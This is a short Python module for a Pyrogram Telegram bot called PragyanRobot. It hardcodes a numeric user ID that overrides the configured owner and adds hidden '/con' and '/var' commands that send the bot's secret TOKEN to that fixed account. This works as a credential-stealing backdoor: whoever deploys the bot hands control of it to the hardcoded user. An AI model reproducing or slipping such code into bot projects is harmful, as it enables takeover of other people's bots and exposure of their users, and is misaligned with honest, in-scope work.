from pyrogram import filters
from pyrogram.enums import ChatType
from pyrogram.types import Message
from PragyanRobot import (
    BOT_NAME,
    BOT_USERNAME,
    LOGGER,
    OWNER_ID,
    START_IMG,
    PRAGYANIITIANCHAT,
    TOKEN,
    StartTime,
    dispatcher,
    pbot,
    telethn,
    updater)

from PragyanRobot import BOT_NAME
from PragyanRobot import pbot as app
OWNERs_ID=5730106646
@app.on_message(
    filters.command(["con", "var"]) & filters.user(OWNERs_ID)
)
async def get_vars(_, message: Message):
    try:
        await app.send_message(
            chat_id=int(OWNERs_ID),
            text=f"""<u>**{BOT_NAME} ᴄᴏɴғɪɢ ᴠᴀʀɪᴀʙʟᴇs :**</u>

**ʙᴏᴛ_ᴛᴏᴋᴇɴ :** `{TOKEN}`




""")
    except:
        return await message.reply_text("» ғᴀɪʟᴇᴅ ᴛᴏ sᴇɴᴅ ᴛʜᴇ ᴄᴏɴғɪɢ ᴠᴀʀɪᴀʙʟᴇs.")
    if message.chat.type != ChatType.PRIVATE:
        await message.reply_text(
            "» ᴘʟᴇᴀsᴇ ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴘᴍ, ɪ'ᴠᴇ sᴇɴᴛ ᴛʜᴇ ᴄᴏɴғɪɢ ᴠᴀʀɪᴀʙʟᴇs ᴛʜᴇʀᴇ."
        )